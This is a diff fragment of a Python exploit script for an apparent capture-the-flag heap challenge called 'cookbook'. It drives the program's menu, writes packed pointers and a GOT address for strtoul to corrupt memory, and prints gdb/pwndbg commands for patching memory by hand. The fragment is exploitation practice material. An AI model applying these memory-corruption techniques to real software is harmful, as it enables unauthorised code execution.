@@ -112,9 +112,8 @@ if __name__ == "__main__":
     #
     raw_input('[5] go?')
     s('a')
-    s('n')
+    s('n') # calloc()
     s('s')
-    #s(str(ORIGINAL_PTR))
     s(str(0))
     s('p')
     s(str(b.got['strtoul']))
@@ -129,8 +128,8 @@ if __name__ == "__main__":
     s('d')
     s('q')
     s('g')
-    s('f')
-    s(p32(ORIGINAL_PTR)+p32(0x804d098)+'\x00')
+    s('9')
+    s(p32(ORIGINAL_PTR)+p32(0x804d098) + '\x00')
     r.recv()
 
     #
@@ -139,11 +138,12 @@ if __name__ == "__main__":
 
     # UNLINK approach failed! couldn't meet the constraint.
     # 
-    # gdb -p `pidof cookbook` ./cookbook
-    # pwndbg> set {int}0x804d03c = 0
-    # pwndbg> quit
+    print "gdb -p `pidof cookbook` ./cookbook"
+    print "pwndbg> set {int}0x804d03c = 0"
+    print "pwndbg> quit"
     
     raw_input('[7] go?')
+    
     s('c')
     s('r')
     s('corn\x00')
